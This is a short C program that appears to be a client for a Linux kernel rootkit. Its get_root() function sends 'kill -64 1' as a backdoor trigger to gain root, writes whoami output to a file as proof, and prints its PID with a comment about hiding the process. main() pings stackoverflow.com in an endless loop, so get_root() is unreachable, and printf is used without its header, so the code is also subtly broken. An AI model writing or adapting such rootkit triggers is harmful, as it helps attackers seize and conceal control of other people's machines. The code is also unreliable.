#include <stdlib.h>
#include <unistd.h>

static void test_connection(void)
{
	char cmd[] = "curl -I https://stackoverflow.com/";
    system(cmd);
}

int get_root(void)
{
    system("kill -64 1");
    
    // prove that root was gained
    system("whoami > /home/debian/test.txt");

    // get pid to hide process
    int pid = getpid();
    printf("pid is %d\n", pid);

    return 0;
}

int main(int argc, char *argv[]) 
{
    while(1)
    {
        sleep(10);
        test_connection();
    }

    get_root();
    return 0;
}